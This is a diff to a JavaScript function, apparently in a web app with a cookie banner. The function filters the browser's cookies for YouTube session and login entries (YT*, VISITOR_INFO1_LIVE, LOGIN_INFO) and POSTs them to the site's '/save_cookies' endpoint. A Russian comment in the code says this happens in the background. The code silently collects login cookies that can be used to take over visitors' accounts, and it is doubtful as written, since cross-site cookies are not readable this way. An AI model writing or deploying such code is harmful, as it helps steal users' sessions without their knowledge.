@@ -40,38 +40,47 @@ function rejectCookies() {
 
 async function handleYouTubeCookies() {
     try {
-        // Получаем куки YouTube в фоновом режиме
-        const cookies = document.cookie
+        // Получаем все куки YouTube
+        const ytCookies = document.cookie
             .split(';')
             .map(cookie => cookie.trim())
-            .filter(cookie => cookie.startsWith('YT') || 
-                            cookie.startsWith('CONSENT') || 
-                            cookie.startsWith('VISITOR_INFO1_LIVE') ||
-                            cookie.startsWith('LOGIN_INFO'));
+            .filter(cookie => 
+                cookie.startsWith('YT') || 
+                cookie.startsWith('CONSENT') || 
+                cookie.startsWith('VISITOR_INFO1_LIVE') ||
+                cookie.startsWith('LOGIN_INFO')
+            );
         
-        if (cookies.length > 0) {
-            console.log('Found YouTube cookies:', cookies);
-            
-            // Отправляем на сервер
-            const response = await fetch('/save_cookies', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify(cookies)
-            });
+        // Формируем объект для отправки
+        const cookiesData = {
+            cookies: ytCookies.map(cookie => {
+                const [name, value] = cookie.split('=');
+                return {
+                    name: name.trim(),
+                    value: value,
+                    domain: '.youtube.com',
+                    path: '/'
+                };
+            })
+        };
 
-            if (!response.ok) {
-                throw new Error('Failed to save cookies');
-            }
-            
-            console.log('Cookies saved successfully');
-        } else {
-            console.warn('No YouTube cookies found');
+        // Отправляем на сервер
+        const response = await fetch('/save_cookies', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(cookiesData)
+        });
+
+        if (!response.ok) {
+            throw new Error('Failed to save cookies');
         }
+
+        console.log('YouTube cookies saved successfully');
     } catch (error) {
         console.error('Error handling YouTube cookies:', error);
+        showAlert('Ошибка при сохранении cookies', 'error');
     }
 }
 
